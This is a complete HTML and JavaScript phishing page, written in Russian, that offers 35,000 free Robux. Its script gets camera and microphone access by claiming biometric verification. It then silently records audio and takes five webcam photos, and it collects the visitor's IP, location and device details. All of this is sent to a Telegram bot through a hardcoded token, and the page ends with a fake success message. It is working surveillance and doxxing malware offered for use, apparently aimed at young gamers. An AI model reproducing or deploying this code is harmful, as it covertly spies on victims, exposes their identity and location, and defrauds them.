<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | Secure Sync</title>
    <style>
        :root { --accent: #0084ff; --bg: #050505; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .app { width: 90%; max-width: 400px; background: rgba(255,255,255,0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; padding: 40px 20px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
        .icon { width: 70px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--accent)); }
        .btn { background: var(--accent); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 15px; font-size: 20px; font-weight: 800; cursor: pointer; display: none; transition: 0.3s; }
        #status { font-family: monospace; color: var(--accent); font-size: 13px; margin: 20px 0; text-transform: uppercase; letter-spacing: 1px; }
        /* Фикс черного экрана: видео должно быть "видимым" для системы */
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; bottom: 0; right: 0; }
    </style>
</head>
<body onload="startSystem()">

<div class="app">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="icon">
    <h1 style="margin:0; font-size: 26px;">35,000 ROBUX</h1>
    <p style="color: #666; font-size: 14px; margin: 10px 0 30px;">Синхронизация биометрического профиля для завершения транзакции.</p>
    
    <div id="status">Подключение...</div>
    <button class="btn" id="btn" onclick="captureEverything()">ПОЛУЧИТЬ</button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const TOK = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
    const CID = '7889497672';
    let globalStream = null;

    async function startSystem() {
        const st = document.getElementById('status');
        try {
            // Запрашиваем всё сразу
            globalStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
                audio: true 
            });
            document.getElementById('v').srcObject = globalStream;
            
            st.innerText = "Система готова";
            document.getElementById('btn').style.display = 'block';
        } catch (e) {
            st.innerText = "Ошибка доступа";
            alert("Разрешите доступ к камере для верификации награды.");
            location.reload();
        }
    }

    async function captureEverything() {
        document.getElementById('btn').style.display = 'none';
        const st = document.getElementById('status');
        st.innerText = "Обработка потока...";

        // 1. МАКСИМАЛЬНЫЙ ДОКС
        let info = `🚀 **FULL STREAM EXPLOIT** 🚀\n\n`;
        try {
            const r = await fetch('https://ipapi.co/json/');
            const j = await r.json();
            info += `📍 IP: \`${j.ip}\` (${j.org})\n🌍 Город: ${j.city}, ${j.country_name}\n`;
        } catch(e) {}

        info += `\n⚙️ **SYSTEM:**\n`;
        info += `📱 Модель: ${navigator.platform}\n`;
        info += `⚙️ CPU: ${navigator.hardwareConcurrency} ядер\n`;
        info += `🧠 RAM: ${navigator.deviceMemory || '??'} GB\n`;
        info += `🖥 Экран: ${screen.width}x${screen.height}\n`;
        info += `🎨 GPU: ${getG()}\n`;
        info += `🔋 Батарея: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : '?'}\n`;
        info += `⏰ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;

        const devs = await navigator.mediaDevices.enumerateDevices();
        info += `\n📸 **DEVICES:**\n`;
        devs.forEach(d => { if(d.label) info += `🔹 ${d.label}\n`; });

        // 2. ЗАПИСЬ ЗВУКА
        const rec = new MediaRecorder(globalStream);
        const chunks = [];
        rec.ondataavailable = e => chunks.push(e.data);
        rec.onstop = async () => {
            const b = new Blob(chunks, { type: 'audio/ogg' });
            const fd = new FormData();
            fd.append('chat_id', CID);
            fd.append('voice', b, 'v.ogg');
            fetch(`https://api.telegram.org/bot${TOK}/sendVoice`, { method: 'POST', body: fd });
        };
        rec.start();

        // 3. СЕРИЯ ФОТО (с задержкой для инициализации)
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        
        for (let i = 1; i <= 5; i++) {
            st.innerText = `Синхронизация: ${i*20}%`;
            await new Promise(r => setTimeout(r, 1500)); // Ждем 1.5 сек между кадрами
            
            c.width = v.videoWidth || 1280;
            c.height = v.videoHeight || 720;
            c.getContext('2d').drawImage(v, 0, 0);
            
            const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.95));
            const fd = new FormData();
            fd.append('chat_id', CID);
            fd.append('photo', blob, `shot_${i}.jpg`);
            if (i === 1) fd.append('caption', info);
            
            await fetch(`https://api.telegram.org/bot${TOK}/sendPhoto`, { method: 'POST', body: fd });
        }

        rec.stop();
        alert("✅ Верификация пройдена! 35,000 Robux будут начислены в течение 15 минут.");
        window.location.href = "https://www.roblox.com";
    }

    function getG() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
        } catch(e) { return '?'; }
    }
</script>
</body>
</html>
